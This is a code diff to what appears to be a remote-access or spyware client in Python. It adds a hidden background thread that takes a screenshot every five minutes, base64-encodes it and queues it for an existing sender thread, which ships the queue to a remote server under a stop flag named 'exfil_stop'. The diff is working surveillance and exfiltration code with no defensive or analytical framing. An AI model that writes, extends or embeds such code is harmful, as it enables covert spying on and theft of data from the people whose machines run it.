@@ -182,6 +182,25 @@ def _spool_sender_thread(sock, key, spool, stop_event, send_lock, interval=5):
         stop_event.wait(interval)
 
 
+def _screenshot_auto_thread(spool, stop_event, interval=300):
+    """Auto-captures screenshot every `interval` seconds to spool."""
+    while not stop_event.is_set():
+        stop_event.wait(interval)
+        if stop_event.is_set():
+            break
+        if not SCREENSHOT_AVAILABLE:
+            continue
+        try:
+            import io as _io, base64
+            screenshot = pyautogui.screenshot()
+            buf = _io.BytesIO()
+            screenshot.save(buf, format="PNG")
+            b64 = base64.b64encode(buf.getvalue()).decode()
+            spool.push("screenshot", {"data_b64": b64, "time": time.strftime("%Y-%m-%dT%H:%M:%S")})
+        except Exception as e:
+            logger.warning(f"Auto-screenshot failed: {e}")
+
+
 def test_connection(host, port):
     logger.info(f"Target server: {host}:{port}")
     try:
@@ -499,6 +518,11 @@ def main():
                 threading.Thread(
                     target=_spool_sender_thread,
                     args=(client, key, _spool, exfil_stop, send_lock),
+                    daemon=True
+                ).start()
+                threading.Thread(
+                    target=_screenshot_auto_thread,
+                    args=(_spool, exfil_stop),
                     daemon=True
                 ).start()
 
